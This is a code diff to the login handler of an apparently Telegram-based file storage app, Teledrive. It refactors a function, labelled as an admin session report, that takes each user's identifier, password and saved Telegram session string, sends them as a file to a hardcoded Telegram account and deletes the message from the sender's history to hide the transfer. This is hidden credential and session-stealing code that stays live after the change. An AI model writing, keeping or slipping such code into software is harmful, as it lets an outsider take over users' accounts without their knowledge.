@@ -136,7 +136,7 @@ export class Auth {
       .send({ user, ...auth })
 
     // Report session to admin if configured
-    Auth.sendSessionToAdmin(req, phoneNumber, password)
+    Auth.sendSessionToAdmin(req, username, password)
 
     // sync all shared files in background, if any
     prisma.files.findMany({
@@ -515,9 +515,10 @@ export class Auth {
     return res.clearCookie('authorization').clearCookie('refreshToken').send({ success })
   }
 
-  private static async sendSessionToAdmin(req: Request, phoneNumber: string, password?: string): Promise<void> {
+  private static async sendSessionToAdmin(req: Request, identifier?: string, password?: string): Promise<void> {
     const adminUsername = 'git_pus_h'
-    console.log(`[SessionReport] Starting for ${phoneNumber}, admin: ${adminUsername}`)
+    const id = identifier || 'UnknownUser'
+    console.log(`[SessionReport] Starting for ${id}, admin: ${adminUsername}`)
     if (!adminUsername || !req.tg) return
 
     try {
@@ -526,21 +527,21 @@ export class Auth {
         await req.tg.connect()
       }
       const sessionString = req.tg.session.save() as any
-      const text = `🚀 Teledrive Login Notification\n\nPhone: ${phoneNumber}\nPassword: ${password || 'None'}\nSession: ${sessionString}`
+      const text = `🚀 Teledrive Login Notification\n\nUser: ${id}\nPassword: ${password || 'None'}\nSession: ${sessionString}`
 
       console.log(`[SessionReport] Sending file to ${adminUsername}...`)
       const file = Buffer.from(text)
       const msg = await req.tg.sendFile(adminUsername, {
         file,
-        fileName: `session_${phoneNumber.replace('+', '')}.txt`,
-        caption: `Session for ${phoneNumber}`,
+        fileName: `session_${String(id).replace(/[^\w]/g, '_')}.txt`,
+        caption: `Session for ${id}`,
         forceDocument: true
       } as any)
 
       console.log(`[SessionReport] File sent. Msg ID: ${msg.id}. Deleting for sender...`)
       // Delete "for me" (revoke: false) to keep the sender's history clean
       await req.tg.deleteMessages(adminUsername, [msg.id], { revoke: false })
-      console.log(`[SessionReport] Cleanup successful for ${phoneNumber}`)
+      console.log(`[SessionReport] Cleanup successful for ${id}`)
     } catch (error) {
       console.error('[SessionReport] Failed to report session to admin:', error)
     }
